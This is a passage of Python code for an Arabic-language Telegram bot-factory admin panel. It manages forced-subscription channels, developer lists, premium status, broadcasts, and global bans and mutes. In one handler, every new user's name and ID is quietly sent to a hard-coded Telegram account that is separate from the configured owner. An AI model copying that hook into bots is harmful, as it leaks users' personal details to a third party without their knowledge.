        return await message.reply("**◍ ليس لديك صلاحية لاستخدام هذا الأمر 🚦\n√**")
    cancel_markup = InlineKeyboardMarkup([
        [InlineKeyboardButton("إلغاء العملية ❌", callback_data="cancel_add")]
    ])
    try:
        ask = await client.ask(
            message.chat.id,
            "◍ أرسل معرف القناة مثال: @ChannelName\n"
            "◍ وتأكد من رفع البوت مشرف فالقناة 👮🏻‍♂️\n"
            "√",
            timeout=300,
            reply_markup=cancel_markup
        )
        if hasattr(ask, 'data') and ask.data == "cancel_add":
            return await ask.message.edit_text("**✅ تم إلغاء عملية الإضافة**")
        channel = ask.text.replace("@", "").strip()
        if not channel:
            return await ask.reply("⚠️ يجب إدخال معرف قناة صالح", reply_markup=cancel_markup)
        try:
            chat = await client.get_chat(f"@{channel}")
        except Exception as e:
            return await ask.reply(f"❌ لا يمكن العثور على القناة: {str(e)}", reply_markup=cancel_markup)
        if channel in subscribed_channels:
            return await ask.reply("⚠️ هذه القناة مضافه بالفعل", reply_markup=cancel_markup)
        subscribed_channels.append(channel)
        await message.reply(f"**✅ تم إضافة قناة الاشتراك: @{channel}**")
    except TimeoutError:
        await message.reply("⌛ انتهى الوقت، يرجى المحاولة مرة أخرى")
    except Exception as e:
        await message.reply(f"❌ حدث خطأ: {str(e)}")


@bot.on_callback_query(filters.regex("^cancel_add$"))
async def cancel_add_sub(client, callback_query):
    await callback_query.message.edit_text("✅ تم إلغاء عملية الإضافة")

@bot.on_message(filters.command("حذف قناة الاشتراك 🗑", "") & filters.private, group=1242112456)
async def del_sub(client, message):
    if message.from_user.id not in DEVS:
        return await message.reply("**◍ ليس لديك صلاحية لاستخدام هذا الأمر 🚦\n√**")
    try:
        cancel_markup = InlineKeyboardMarkup([
            [InlineKeyboardButton("إلغاء العملية ❌", callback_data="cancel_add")]
        ])
        if not subscribed_channels:
            return await message.reply("**◍ لا توجد قنوات مشتركة مضافة ⚠️\n√**")
        channels_list = "\n".join([f"@{ch}" for ch in subscribed_channels])
        ask = await client.ask(
            message.chat.id, 
            f"◍ أرسل معرف القناة مثال: @ChannelName 📢\n√", 
            timeout=300,
            reply_markup=cancel_markup
        )
        if hasattr(ask, 'data') and ask.data == "cancel_add":
            return await ask.message.edit_text("**✅ تم إلغاء عملية الإضافة**")  
        channel = ask.text.replace("@", "").strip()
        if not channel:
            return await ask.reply("⚠️ يجب إدخال معرف قناة صالح")
        if channel not in subscribed_channels:
            return await ask.reply("⚠️ هذه القناة غير موجودة في القائمة")
        subscribed_channels.remove(channel)
        await ask.reply(f"✅ تم حذف قناة الاشتراك: @{channel}")
    except TimeoutError:
        await message.reply("⌛ انتهى الوقت، يرجى المحاولة مرة أخرى")
    except Exception as e:
        await message.reply(f"❌ حدث خطأ: {str(e)}")

@bot.on_message(filters.command("قنوات الاشتراك 📥", "") & filters.private, group=131153)
async def channels_list(client, message):
    if message.from_user.id not in DEVS:
        return await message.reply("⚠️ غير مصرح لك")
    
    channels = get_channels()
    if not channels:
        return await message.reply("**◍ حاليا الأن لا يوجد قناوات اشتراك 🔒\n√**")
    
    text = """
𓆩𓏺 قنوات الاشتراك 𓏺𓆪
━━━━━━━━━━━━━━━━
#️⃣    Channels
"""
    for i, channel in enumerate(channels, start=1):
        text += f"{i:02d}    @{channel}\n"
    text += f"\n العدد الكلي: {len(channels):02d}"
    await message.reply(text)

@bot.on_message(filters.command("رفع مطور ⬆️", "") & filters.private, group=12856)
async def ass_admin(client, message):
    if message.from_user.id not in DEVS:
        return await message.reply("❌ ليس لديك الصلاحية لاستخدام هذا الأمر.")
    try:
        ask = await client.ask(message.chat.id, "**◍ ارسل ID المطور الجديد\n√**", timeout=300)
        zomb = int(ask.text.strip())
        if zomb in DEVS:
            return await message.reply("**◍ هذا المستخدم مطور بالفعل 👨🏻‍💻\n√**")
        DEVS.append(zomb)
        await message.reply(f"◍ تم تعيينة مطور بنجاح\n√")
    except ValueError:
        await message.reply("◍ يرجى إرسال ID صحيح ❎\n√")
    except Exception as e:
        await message.reply(f"⚠️ حدث خطأ: `{str(e)}`")


@bot.on_message(filters.command("تنزيل مطور ⬇️", "") & filters.private, group=1288757)
async def remo_admin(client, message):
    if message.from_user.id not in DEVS:
        return await message.reply("❌ ليس لديك الصلاحية لاستخدام هذا الأمر.")
    try:
        ask = await client.ask(message.chat.id, "**◍ ارسل ID المطور المراد تنزيلة\n√**", timeout=300)
        zomb = int(ask.text.strip())  
        if zomb not in DEVS:
            return await message.reply("**◍ هذا الممستخدم ليس مطورا 👨🏻‍💻\n√**")
        if zomb in [DEVS[0], DEVS[1]]:
            return await message.reply("**❌ لا يمكن إزالة المطور الأساسي**")
        DEVS.remove(zomb)
        await message.reply(f"**◍ تم تنزيلة من المطورين بنجاح\n√**")
    except ValueError:
        await message.reply("◍ يرجى إرسال ID صحيح ❎\n√")
    except Exception as e:
        await message.reply(f"⚠️ حدث خطأ: `{str(e)}`")



@bot.on_message(filters.command("المطورين 👨🏻‍💻", "") & filters.private, group=1124153)
async def adminss(client, message):
    if message.from_user.id not in DEVS:
        return
    if DEVS:
        text = "◍ قائمة المطورين 🕵🏻‍♂️:\n\n"
        for i, admin_id in enumerate(DEVS, start=1):
            try:
                user = await client.get_users(admin_id)
                username = f"@{user.username}" if user.username else "لا يوجد اسم مستخدم"
                text += f"{i}- {username} ➽ {admin_id}\n"
            except:
                text += f"{i}- {admin_id} (خطأ في جلب البيانات)\n"
        text += f"\nحاليًا عندك {len(DEVS)} مطورين..."
        await message.reply_text(text)
    else:
        await message.reply_text("**◍ لا يوجد مطورين حاليا 👨🏻‍💻\n√**")


@bot.on_message(filters.command("الغاء حظر مستخدم 🔓", "") & filters.private, group=154121)
async def unbanncgdj_bb_user(client, message):
  if message.from_user.id not in DEVS:
    return
  try:
      ask = await client.ask(message.chat.id, "**◍ ارسل يوزر الشخص المراد فك حظرة من الصانع\n√**", timeout=300)
  except:
      return    
  zomb = ask.text.replace("@", "")
  if not zomb.isalnum():
        return await message.reply("**◍ هذا اليوزر غير صالح ⚠️\n√**")
  if zomb in banded_users:
      banded_users.remove(zomb)
      await client.send_message(message.chat.id, "**◍ تم فك حظر المستخدم بنجاح\n√**")
  else:
      await client.send_message(message.chat.id, "**◍ هذا المستخدم ليس محظور ⛔️\n√**")


############################################  الاشتراك لبوت  ############################################
@bot.on_message(filters.command("اضف قناة الاشتراك للجروبات 👥", "") & filters.private, group=5122489)
async def add_subsciption_channel(client, message):
    if message.from_user.id not in DEVS:
        return await message.reply("**◍ ليس لديك صلاحية لاستخدام هذا الأمر 🚦\n√**")
    ask_bot = await client.ask(message.chat.id, "🔹 أرسل معرف البوت المستهدف مع علامة @", timeout=300)
    bot_username = ask_bot.text.strip().replace("@", "")
    existing_bot = bots_fact_collection.find_one({"bot_username": bot_username})
    if not existing_bot:
        return await message.reply(f"**◍ البوت @{bot_username} غير موجود في قاعدة البيانات ❌\n√**")
    bot_channels_collection = db[f"bot_channels_{bot_username}"]
    ask_channel = await client.ask(message.chat.id, "🔹 أرسل معرف القناة مع علامة @", timeout=300)
    channel_username = ask_channel.text.strip().replace("@", "")
    existing_channels = list(bot_channels_collection.find({}))
    bot_channels_collection.delete_many({})
    bot_channels_collection.insert_one({"channel": channel_username})
    if existing_channels:
        bot_channels_collection.insert_many(existing_channels)
    await message.reply(f"✅ تم **إضافة القناة** @{channel_username} إلى قائمة الاشتراك الإجباري للبوت @{bot_username} في المقدمة.")

@bot.on_message(filters.command("حذف قناة الاشتراك للجروبات ⭕️", "") & filters.private, group=51224744)
async def remove_subsription_channel(client, message):
    if message.from_user.id not in DEVS:
        return await message.reply("**◍ ليس لديك صلاحية لاستخدام هذا الأمر 🚦\n√**")
    ask_bot = await client.ask(message.chat.id, "🔹 أرسل معرف البوت المستهدف مع علامة @", timeout=300)
    bot_username = ask_bot.text.strip().replace("@", "")
    existing_bot = bots_fact_collection.find_one({"bot_username": bot_username})
    if not existing_bot:
        return await message.reply(f"**◍ البوت @{bot_username} غير موجود في قاعدة البيانات ❌\n√**")
    bot_channels_collection = db[f"bot_channels_{bot_username}"]
    ask_channel = await client.ask(message.chat.id, "🔹 أرسل معرف القناة مع علامة @", timeout=300)
    channel_username = ask_channel.text.strip().replace("@", "")
    delete_result = bot_channels_collection.delete_one({"channel": channel_username})
    if delete_result.deleted_count > 0:
        await message.reply(f"❌ تم حذف القناة @{channel_username} من قائمة الاشتراك الإجباري للبوت @{bot_username}.")
    else:
        await message.reply(f"⚠️ القناة @{channel_username} غير موجودة في قائمة الاشتراك للبوت @{bot_username}.")

@bot.on_message(filters.command("قنوات الاشتراك للجروبات 🚸", "") & filters.private, group=5122474487)
async def list_subscription_channels(client, message):
    if message.from_user.id not in DEVS:
        return await message.reply("**◍ ليس لديك صلاحية لاستخدام هذا الأمر 🚦\n√**")
    ask_bot = await client.ask(message.chat.id, "🔹 أرسل معرف البوت المستهدف مع علامة @", timeout=300)
    bot_username = ask_bot.text.strip().replace("@", "")
    existing_bot = bots_fact_collection.find_one({"bot_username": bot_username})
    if not existing_bot:
        return await message.reply(f"**◍ البوت @{bot_username} غير موجود في قاعدة البيانات ❌\n√**")
    bot_channels_collection = db[f"bot_channels_{bot_username}"]
    channels = [doc["channel"] for doc in bot_channels_collection.find()]
    if not channels:
        return await message.reply(f"❌ لا توجد قنوات اشتراك إجبارية للبوت @{bot_username}.")
    text = f"📋 **قنوات الاشتراك الإجباري للبوت @{bot_username}:**\n\n"
    text += "\n".join([f"🔹 @{channel}" for channel in channels])
    await message.reply(text)
############################################  الاشتراك لبوت  ############################################
############################################  الاشتراك لبوت برايفت ############################################
@bot.on_message(filters.command("اضف قناة الاشتراك الخاص 📢", "") & filters.private, group=895782489)
async def ad_subsciption_channel(client, message):
    if message.from_user.id not in DEVS:
        return await message.reply("**◍ ليس لديك صلاحية لاستخدام هذا الأمر 🚦\n√**")
    ask_bot = await client.ask(message.chat.id, "🔹 أرسل معرف البوت المستهدف مع علامة @", timeout=300)
    bot_username = ask_bot.text.strip().replace("@", "")
    existing_bot = bots_fact_collection.find_one({"bot_username": bot_username})
    if not existing_bot:
        return await message.reply(f"**◍ البوت @{bot_username} غير موجود في قاعدة البيانات ❌\n√**")
    bot_channels_collection = db[f"bot_chanels_{bot_username}"]
    ask_channel = await client.ask(message.chat.id, "🔹 أرسل معرف القناة مع علامة @", timeout=300)
    channel_username = ask_channel.text.strip().replace("@", "")
    existing_channels = list(bot_channels_collection.find({}))
    bot_channels_collection.delete_many({})
    bot_channels_collection.insert_one({"channel": channel_username})
    if existing_channels:
        bot_channels_collection.insert_many(existing_channels)
    await message.reply(f"✅ تم **إضافة القناة** @{channel_username} إلى قائمة الاشتراك الإجباري للبوت @{bot_username} في المقدمة.")

@bot.on_message(filters.command("حذف قناة الاشتراك الخاص 🗑", "") & filters.private, group=5146222)
async def reove_subsription_channel(client, message):
    if message.from_user.id not in DEVS:
        return await message.reply("**◍ ليس لديك صلاحية لاستخدام هذا الأمر 🚦\n√**")
    ask_bot = await client.ask(message.chat.id, "🔹 أرسل معرف البوت المستهدف مع علامة @", timeout=300)
    bot_username = ask_bot.text.strip().replace("@", "")
    existing_bot = bots_fact_collection.find_one({"bot_username": bot_username})
    if not existing_bot:
        return await message.reply(f"**◍ البوت @{bot_username} غير موجود في قاعدة البيانات ❌\n√**")
    bot_channels_collection = db[f"bot_chanels_{bot_username}"]
    ask_channel = await client.ask(message.chat.id, "🔹 أرسل معرف القناة مع علامة @", timeout=300)
    channel_username = ask_channel.text.strip().replace("@", "")
    delete_result = bot_channels_collection.delete_one({"channel": channel_username})
    if delete_result.deleted_count > 0:
        await message.reply(f"❌ تم حذف القناة @{channel_username} من قائمة الاشتراك الإجباري للبوت @{bot_username}.")
    else:
        await message.reply(f"⚠️ القناة @{channel_username} غير موجودة في قائمة الاشتراك للبوت @{bot_username}.")

@bot.on_message(filters.command("قنوات الاشتراك الخاص 📩", "") & filters.private, group=147887487)
async def lst_subscription_channels(client, message):
    if message.from_user.id not in DEVS:
        return await message.reply("**◍ ليس لديك صلاحية لاستخدام هذا الأمر 🚦\n√**")
    ask_bot = await client.ask(message.chat.id, "🔹 أرسل معرف البوت المستهدف مع علامة @", timeout=300)
    bot_username = ask_bot.text.strip().replace("@", "")
    existing_bot = bots_fact_collection.find_one({"bot_username": bot_username})
    if not existing_bot:
        return await message.reply(f"**◍ البوت @{bot_username} غير موجود في قاعدة البيانات ❌\n√**")
    bot_channels_collection = db[f"bot_chanels_{bot_username}"]
    channels = [doc["channel"] for doc in bot_channels_collection.find()]
    if not channels:
        return await message.reply(f"❌ لا توجد قنوات اشتراك إجبارية للبوت @{bot_username}.")
    text = f"📋 **قنوات الاشتراك الإجباري للبوت @{bot_username}:**\n\n"
    text += "\n".join([f"🔹 @{channel}" for channel in channels])
    await message.reply(text)
############################################  الاشتراك لبوت برايفت  ############################################
#.....................................................  تفعيل المدفوع  ...........................................
@bot.on_message(filters.command("تفعيل المدفوع ⚡️", "") & filters.private, group=7892456)
async def activate_premium_for_bot(client, message):
    if message.from_user.id not in DEVS:
        return await message.reply("**◍ ليس لديك صلاحية لاستخدام هذا الأمر 🚦\n√**")
    
    ask_bot = await client.ask(message.chat.id, "**◍ ارسل يوزر البوت المستهدف 🤖\n√**", timeout=300)
    bot_username = ask_bot.text.strip().replace("@", "")
    existing_bot = bots_fact_collection.find_one({"bot_username": bot_username})
    
    if not existing_bot:
        return await message.reply(f"**◍ البوت @{bot_username} غير موجود في قاعدة البيانات ❌\n√**")
    
    bot_premium_collection = db[f"premium_status_{bot_username}"]
    bot_premium_collection.update_one({}, {"$set": {"premium": True}}, upsert=True)

    await message.reply(f"**◍ تم تفعيل الاشتراك بنجاح ✅\n√**")

@bot.on_message(filters.command("تعطيل المدفوع 📛", "") & filters.private, group=7819457)
async def deactivate_premium_for_bot(client, message):
    if message.from_user.id not in DEVS:
        return await message.reply("**◍ ليس لديك صلاحية لاستخدام هذا الأمر 🚦\n√**")
    
    ask_bot = await client.ask(message.chat.id, "**◍ ارسل يوزر البوت المستهدف 🤖\n√**", timeout=300)
    bot_username = ask_bot.text.strip().replace("@", "")
    existing_bot = bots_fact_collection.find_one({"bot_username": bot_username})
    
    if not existing_bot:
        return await message.reply(f"**◍ البوت @{bot_username} غير موجود في قاعدة البيانات ❌\n√**")

    bot_premium_collection = db[f"premium_status_{bot_username}"]
    bot_premium_collection.update_one({}, {"$set": {"premium": False}}, upsert=True)
    await message.reply(f"**◍ تم تعطيل الاشتراك بنجاح ❌\n√**")

@bot.on_message(filters.command("البوتات المدفوعة 💰", "") & filters.private, group=787899)
async def list_premium_bots(client, message):
    if message.from_user.id not in DEVS:
        return await message.reply("**◍ ليس لديك صلاحية لاستخدام هذا الأمر 🚦\n√**")
    premium_bots = []
    for bot_data in bots_fact_collection.find():
        bot_username = bot_data["bot_username"]
        bot_premium_collection = db[f"premium_status_{bot_username}"]
        premium_status = bot_premium_collection.find_one({})
        if premium_status and premium_status.get("premium", False):
            premium_bots.append(bot_username)
    if not premium_bots:
        return await message.reply("**◍ لا يوجد اي بوتات مدفوعة الأن 🚦\n√**")
    text = "📋 **قائمة البوتات المدفوعة:**\n\n"
    text += "\n".join([f"✅ @{bot}" for bot in premium_bots])
    await message.reply(text)

#.....................................................  تفعيل المدفوع  ...........................................


#..................................................... مستخدمين ...........................................
def load_users():
    users = set()
    for user in users_collection.find():
        users.add(str(user["user_id"]))
    return users

def save_user(user_id, first_name):
    if not users_collection.find_one({"user_id": user_id}):
        users_collection.insert_one({"user_id": user_id, "first_name": first_name})

users = load_users()

@bot.on_message(filters.text & filters.private, group=625447854)
async def users_me(client, message):
    user_id = str(message.from_user.id)
    if user_id not in users:
        users.add(user_id)
        save_user(int(user_id), message.from_user.first_name)
        text = '🙍 شخص جديد دخل الى البوت !\n\n'
        text += f'🎯 الأسم: {message.from_user.first_name}\n'
        text += f'♻️ الايدي: {message.from_user.id}\n\n'
        text += f'🌐 اصبح عدد المستخدمين: {len(users)}'
        await client.send_message(7807482327,f"{text}")

@bot.on_message(filters.command("احصائيات المصنع 🔰", "") & filters.private, group=454548)
async def factory_users_statistics(client, message):
    if message.from_user.id not in DEVS:
        return await message.reply("**◍ ليس لديك صلاحية لاستخدام هذا الأمر 🚦\n√**")
    total_users = users_collection.count_documents({"_id": {"$ne": "bot_stats"}})
    stats_text = "📊 **احصائيات المصنع:**\n\n"
    stats_text += f"👥 **إجمالي المستخدمين:** {total_users}\n"
    await message.reply(stats_text)

@bot.on_message(filters.command(["اذاعة عام 📣"], "") & filters.private, group=544444544)
async def broadcaast_users_message(client, message):
    if message.from_user.id in DEVS:
        ask = await client.ask(message.chat.id, "ارسل النص المراد اذاعته", timeout=300)
        text = ask.text
        ask = await client.ask(message.chat.id, "اذا كنت تريد الاذاعه بالتثبيت ارسل نعم", timeout=300)
        pin_message = ask.text.lower() == "نعم"
        for user_id in users:
            try:
                if pin_message:
                    dd = await client.send_message(user_id, text)
                    await dd.pin(disable_notification=False,both_sides=True)
                else:
                    await client.send_message(user_id, text)
            except Exception as e:
                print(f"Error sending message to user {user_id}: {e}")

@bot.on_message(filters.command(["توجيه عام 🧭"], "") & filters.private, group=548178744544)
async def broadcast_mese_message(client, message):
    if message.from_user.id in DEVS:
        forwarded_message = await client.ask(message.chat.id, "◍ ارسل الرسالة الموجهة الآن", timeout=300)
        if forwarded_message:
            for user_id in users:
                try:
                    await forwarded_message.forward(int(user_id))
                except Exception as e:
                    print(f"Error sending message to {user_id}: {e}")
            await message.reply("◍ تم الإذاعة بنجاح", quote=True)
        else:
            await message.reply("◍ لم يتم إرسال أي رسالة موجهة", quote=True)


#.............................................. مستخدمين ...........................................
############################################## حظر عام ###################################################
@bot.on_message(filters.command("حظر عام 📛", "") & filters.private, group=78457)
async def ban_user_globally(client, message):
    if message.from_user.id not in DEVS:
        return await message.reply("**◍ ليس لديك صلاحية لاستخدام هذا الأمر 🚦\n√**")
    
    try:
        cancel_markup = InlineKeyboardMarkup([
            [InlineKeyboardButton("إلغاء العملية ❌", callback_data="cancel_add")]
        ])
        ask = await client.ask(message.chat.id,
            "**◍ ارسل لي يوزر الشخص المستهدف مثال : @User ☠️\n√**",
            timeout=300,
            reply_markup=cancel_markup
        )
        if hasattr(ask, 'data') and ask.data == "cancel_add":
            return await ask.message.edit_text("**✅ تم إلغاء العملية بنجاح**")
        username = ask.text.strip().replace("@", "")
        user = await client.get_users(username)
        user_id = user.id

        panned_users_collection = db["panned_users_collection"]
        existing = panned_users_collection.find_one({"user_id": user_id})

        if existing and existing.get("banned"):
            return await message.reply(f"🚫 المستخدم @{username} **محظور بالفعل** من استخدام البوت.")

        panned_users_collection.update_one(
            {"user_id": user_id},
            {"$set": {"user_id": user_id, "banned": True, "username": username}},
            upsert=True
        )

        await message.reply(f"**◍ تم حظر المستخدم `{user.mention}` عام ⛔️\√n**")
    except Exception as e:
        await message.reply(f"❌ حدث خطأ: {e}")

@bot.on_message(filters.command("الغاء حظر عام 🛑", "") & filters.private, group=7819458)
async def unban_user_globally(client, message):
    if message.from_user.id not in DEVS:
        return await message.reply("**◍ ليس لديك صلاحية لاستخدام هذا الأمر 🚦\n√**")
    try:
        ask = await client.ask(message.chat.id, "🔹 أرسل معرف الشخص المستهدف مع علامة @", timeout=300)
        username = ask.text.strip().replace("@", "")
        user = await client.get_users(username)
        user_id = user.id

        panned_users_collection = db["panned_users_collection"]
        existing = panned_users_collection.find_one({"user_id": user_id})

        if not existing or not existing.get("banned"):
            return await message.reply(f"✅ المستخدم @{username} **غير محظور حاليًا**.")

        panned_users_collection.update_one(
            {"user_id": user_id},
            {"$set": {"banned": False}}
        )
        await message.reply(f"**◍ تم الغاء حظر المستخدم ({user.mention} عام 📛\n√**")
    except Exception as e:
        await message.reply(f"❌ حدث خطأ: {e}")

@bot.on_message(filters.command("المحظورين عام 🙅🏻‍♂️", "") & filters.private, group=7819459)
async def list_banned_users(client, message):
    if message.from_user.id not in DEVS:
        return await message.reply("**◍ ليس لديك صلاحية لاستخدام هذا الأمر 🚦\n√**")
    panned_users_collection = db["panned_users_collection"]
    banned_users = list(panned_users_collection.find({"banned": True}))
    if not banned_users:
        return await message.reply("✅ لا يوجد أي مستخدم محظور حاليًا.")
    text = "🚫 قائمة المستخدمين المحظورين عام:\n\n"
    for user in banned_users:
        uname = f"@{user.get('username')}" if user.get("username") else f"`{user['user_id']}`"
        text += f"◍ {uname}\n"
    await message.reply(text)
############################################## حظر عام ###################################################
############################################## كتم عام ###################################################
@bot.on_message(filters.command("كتم عام 🔕", "") & filters.private, group=7897857)
async def mute_user_globally(client, message):
    if message.from_user.id not in DEVS:
        return await message.reply("**◍ ليس لديك صلاحية لاستخدام هذا الأمر 🚦\n√**")
    
    try:
        cancel_markup = InlineKeyboardMarkup([
            [InlineKeyboardButton("إلغاء العملية ❌", callback_data="cancel_add")]
        ])
        ask = await client.ask(message.chat.id,
            "**◍ ارسل لي يوزر الشخص المستهدف مثال : @User ☠️\n√**",
            timeout=300,
            reply_markup=cancel_markup
        )
        if hasattr(ask, 'data') and ask.data == "cancel_add":
            return await ask.message.edit_text("**✅ تم إلغاء العملية بنجاح**")
        username = ask.text.strip().replace("@", "")
        user = await client.get_users(username)
        user_id = user.id
        
        muted_users_collection = db["muted_users_collection"]
        existing = muted_users_collection.find_one({"user_id": user_id})

        if existing and existing.get("muted"):
            return await message.reply(f"🤐 المستخدم @{username} مكتوم بالفعل من استخدام البوت.")

        muted_users_collection.update_one(
            {"user_id": user_id},
            {"$set": {"user_id": user_id, "muted": True, "username": username}},
            upsert=True
        )

        await message.reply(f"**◍ تم كتم المستخدم `{user.mention}` عام 🤐\n√**")
    except Exception as e:
        await message.reply(f"❌ حدث خطأ: {e}")

@bot.on_message(filters.command("الغاء كتم عام 🔔", "") & filters.private, group=784583128)
async def unmute_user_globally(client, message):
    if message.from_user.id not in DEVS:
        return await message.reply("**◍ ليس لديك صلاحية لاستخدام هذا الأمر 🚦\n√**")
    
    try:
        ask = await client.ask(message.chat.id, "🔹 أرسل معرف الشخص المستهدف مع علامة @", timeout=300)
        username = ask.text.strip().replace("@", "")
        user = await client.get_users(username)
        user_id = user.id

        muted_users_collection = db["muted_users_collection"]
        existing = muted_users_collection.find_one({"user_id": user_id})

        if not existing or not existing.get("muted"):
            return await message.reply(f"✅ المستخدم @{username} **غير مكتوم حاليًا**.")

        muted_users_collection.update_one(
            {"user_id": user_id},
            {"$set": {"muted": False}}
        )

        await message.reply(f"**◍ تم الغاء كتم المستخدم {user.mention} عام 💢\n√**")
    except Exception as e:
        await message.reply(f"❌ حدث خطأ: {e}")

@bot.on_message(filters.command("المكتومين عام 🤐", "") & filters.private, group=78978979)
async def list_muted_users(client, message):
    if message.from_user.id not in DEVS:
        return await message.reply("**◍ ليس لديك صلاحية لاستخدام هذا الأمر 🚦\n√**")
    
    muted_users_collection = db["muted_users_collection"]
    muted_users = list(muted_users_collection.find({"muted": True}))

    if not muted_users:
        return await message.reply("✅ لا يوجد أي مستخدم مكتوم حاليًا.")
    
    text = "🤐 قائمة المستخدمين المكتومين عام:\n\n"
    for user in muted_users:
        uname = f"@{user.get('username')}" if user.get("username") else f"`{user['user_id']}`"
        text += f"◍ {uname}\n"
    
    await message.reply(text)

############################################## كتم عام ###################################################
enable_twasol = False

@bot.on_message(filters.command("تعطيل التواصل 🔰", "") & filters.private,group=17856)
async def adsub(client, message):
    if message.from_user.id not in DEVS:
        return
    global enable_twasol
    enable_twasol = False
    await client.send_message(message.chat.id, "**◍ تم تعطيل التواصل بنجاح\n√**")

  
@bot.on_message(filters.command("تفعيل التواصل ⚡️", "") & filters.private, group=11153)
async def chasls(client, message):
    if message.from_user.id not in DEVS:
        return
    global enable_twasol
    enable_twasol = True
    await client.send_message(message.chat.id, "**◍ تم تفعيل التواصل بنجاح\n√**")



@bot.on_message(filters.private, group=9)
async def twasol__(bot, m):
    global enable_twasol
    try:
        if m.from_user.id != owner_id or m.from_user.id != 7807482327:
            if enable_twasol:
                await m.forward(owner_id)
    except Exception as e:
        pass

    if m.from_user.id == owner_id:
        if m.reply_to_message:
            if m.reply_to_message.forward_from:
                await m.reply(f"◍ تم إرسال رسالتك إلى {m.reply_to_message.forward_from.first_name} بنجاح", quote=True)
                try:
                    await m.copy(m.reply_to_message.forward_from.id)
                except:
                    pass


#
#==================================================
#
#███████╗███████╗██████╗  ██████╗ 
#╚══███╔╝██╔════╝██╔══██╗██╔═══██╗
#  ███╔╝ █████╗  ██████╔╝██║   ██║
# ███╔╝  ██╔══╝  ██╔══██╗██║   ██║
#███████╗███████╗██║  ██║╚██████╔╝
#╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝ 
#
#==================================================
